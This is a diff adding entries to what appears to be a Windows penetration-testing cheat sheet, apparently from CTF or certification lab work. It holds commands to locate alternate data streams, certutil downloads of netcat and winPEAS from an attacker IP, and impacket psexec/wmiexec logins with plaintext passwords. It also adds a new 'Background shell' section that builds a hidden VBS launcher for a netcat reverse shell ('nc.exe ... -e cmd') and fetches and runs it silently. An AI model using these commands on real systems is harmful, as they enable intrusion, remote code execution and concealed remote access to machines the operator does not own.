@@ -3,6 +3,17 @@ dir directory\*.txt /s /p
 dir C:\proof.txt /s /p
 dir C:\network-secret.txt /s /p
 
+
+#find Alternate Data Stream
+##Find all files in a direcory
+dir /R 
+##find only ADS
+dir   /s /r | find ":$DATA"
+
+dir   /s /r | find ":$DATA" | findStr proof.txt
+#use streams from sysinternal
+streams.exe -accepteula -s
+
 certutil -urlcache -split -f http://192.168.119.149/nc.exe nc.exe
 
 certutil -urlcache -split -f http://192.168.119.149/winPEAS/winPEASx64.exe win.exe
@@ -100,3 +111,26 @@ python /opt/impacket/examples/psexec.py active/Administrator:Ticketmaster1968@10
 python /opt/impacket/examples/psexec.py active/Administrator@10.10.10.100
 
 python /opt/impacket/examples/wmiexec.py active.htb/administrator:ThePassword@10.10.10.100
+
+
+#Backgroud shell
+
+## On linux
+cat << EOF > hidden.vbs
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "C:\windows\temp\test\nc.bat" & Chr(34), 0
+Set WshShell = Nothing
+EOF
+
+cat << EOF > nc.bat
+C:\windows\temp\test\nc.exe 192.168.119.149 4488 -e cmd
+EOF
+
+## On windows
+
+certutil -urlcache -split -f http://192.168.119.149/hidden.vbs
+
+certutil -urlcache -split -f http://192.168.119.149/nc.bat
+
+cmd /c cscript hidden.vbs
+
